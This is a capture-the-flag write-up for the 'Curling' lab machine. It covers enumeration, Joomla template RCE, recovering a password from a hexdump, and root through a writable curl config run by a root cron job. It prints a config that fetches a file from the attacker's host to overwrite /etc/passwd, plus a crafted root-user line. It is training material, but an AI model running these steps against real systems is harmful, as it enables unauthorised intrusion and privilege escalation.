# Curling

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.248
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 12:14 EDT
Nmap scan report for 10.129.85.248
Host is up (0.0063s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

### Blog Enum + Joomla

The page was some type of blog.

<figure><img src="../../../.gitbook/assets/image (1690).png" alt=""><figcaption></figcaption></figure>

In one of the posts, there's a user called `floris`.

<figure><img src="../../../.gitbook/assets/image (2975).png" alt=""><figcaption></figcaption></figure>

The page source also had a hidden file:

<figure><img src="../../../.gitbook/assets/image (3757).png" alt=""><figcaption></figcaption></figure>

Within it, it had a base64-encoded string. We can pipe the output and decode it:

```
$ curl http://10.129.85.248/secret.txt | base64 -d 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    17  100    17    0     0    941      0 --:--:-- --:--:-- --:--:--   944
Curling2018!
```

Can't use these for now, so let's run a `gobuster` scan as well.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.85.248 -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.85.248
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/06 12:16:11 Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 316] [--> http://10.129.85.248/modules/]
/bin                  (Status: 301) [Size: 312] [--> http://10.129.85.248/bin/]
/plugins              (Status: 301) [Size: 316] [--> http://10.129.85.248/plugins/]
/includes             (Status: 301) [Size: 317] [--> http://10.129.85.248/includes/]
/language             (Status: 301) [Size: 317] [--> http://10.129.85.248/language/]
/components           (Status: 301) [Size: 319] [--> http://10.129.85.248/components/]
/images               (Status: 301) [Size: 315] [--> http://10.129.85.248/images/]
/cache                (Status: 301) [Size: 314] [--> http://10.129.85.248/cache/]
/libraries            (Status: 301) [Size: 318] [--> http://10.129.85.248/libraries/]
/tmp                  (Status: 301) [Size: 312] [--> http://10.129.85.248/tmp/]
/layouts              (Status: 301) [Size: 316] [--> http://10.129.85.248/layouts/]
/administrator        (Status: 301) [Size: 322] [--> http://10.129.85.248/administrator/]
/templates            (Status: 301) [Size: 318] [--> http://10.129.85.248/templates/]
/media                (Status: 301) [Size: 314] [--> http://10.129.85.248/media/]
/cli                  (Status: 301) [Size: 312] [--> http://10.129.85.248/cli/]
/server-status        (Status: 403) [Size: 278]
```

Loads of directories. The `/administrator` directory had a Joomla login:

<figure><img src="../../../.gitbook/assets/image (4089).png" alt=""><figcaption></figcaption></figure>

We can login using `floris:Curling2018!`.&#x20;

<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

We can follow the instructions from Hacktrikcs to get RCE on this website by creating new PHP Templates.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce" %}

<figure><img src="../../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>

Then we can get a reverse shell using a `bash` one-liner.&#x20;

<figure><img src="../../../.gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Password Backup

We can't capture the user flag yet. In `floris` home directory, there's a `password-backup` file.

```
www-data@curling:/home/floris$ ls
admin-area  password_backup  user.txt
www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

It appears that the `hexdump` of the original file was taken and this is what is left. We can reverse this with `xxd -r`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1249).png" alt=""><figcaption></figcaption></figure>

This file turns out to be loads of zip files, so we have to do `bunzip2` and `gunzip` twice and `tar` once. Eventually, we will end up with this file:

```
$ cat password.txt   
5d<wdCbdZu)|hChXll
```

We can use this to `su` to `floris`.

<figure><img src="../../../.gitbook/assets/image (3594).png" alt=""><figcaption></figcaption></figure>

### To Root

I ran `pspy64` on the machine to see if there were background processes running as `root`.&#x20;

```
2023/05/06 11:41:01 CMD: UID=0    PID=3317   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input                                                                  
2023/05/06 11:41:01 CMD: UID=0    PID=3316   | /usr/sbin/CRON -f 
2023/05/06 11:41:01 CMD: UID=0    PID=3315   | /usr/sbin/CRON -f
2023/05/06 11:41:01 CMD: UID=0    PID=3320   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

There was some `curl` command being used to read something. Here are the files in question:

```
floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"
floris@curling:~/admin-area$ head -n 10 report 
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charset="utf-8" />
        <base href="http://127.0.0.1/" />
        <meta name="description" content="best curling site on the planet!" />
        <meta name="generator" content="Joomla! - Open Source Content Management" />
        <title>Home</title>
        <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
```

So this was reading the URL from a file and outputting it elsewhere. The command uses the `config` command, which one can read more here:

{% embed url="https://curl.se/docs/manpage.html" %}

Essentially, we can specify extra tags here, like `--output` as `output` and so on.

```
# --- Example file ---
# this is a comment
url = "example.com"
output = "curlhere.html"
user-agent = "superagent/1.0"
# and fetch another URL too
url = "example.com/docs/manpage.html"
-O
referer = "http://nowhereatall.example.com/"
# --- End of example file ---
```

This means that we can download any files as `root` since `root` is the one who is running the commands by changing the `curl` configuration file used (which we conveniently have write access over).&#x20;

This means we can overwrite files like `/etc/passwd` and add new `root` users to the machine. First, we would need to get a copy of the `/etc/passwd` of the machine onto ours, and append this line to it:

```
innocent:$1$innocent$VMCqt3i38ds/9QvgZcetR0:0:0:/root:/bin/bash
```

This would create a new user within the `/etc/passwd` file called `innocent` with a password of `password123`. Then we need to change the configuration files to this and start a HTT Pserver:

```
url = "http://10.10.14.13/passwd_original"
output = "/etc/passwd"
```

After the machine has downloaded the file, we can just `su` to our new user.

<figure><img src="../../../.gitbook/assets/image (1836).png" alt=""><figcaption></figcaption></figure>

Rooted!
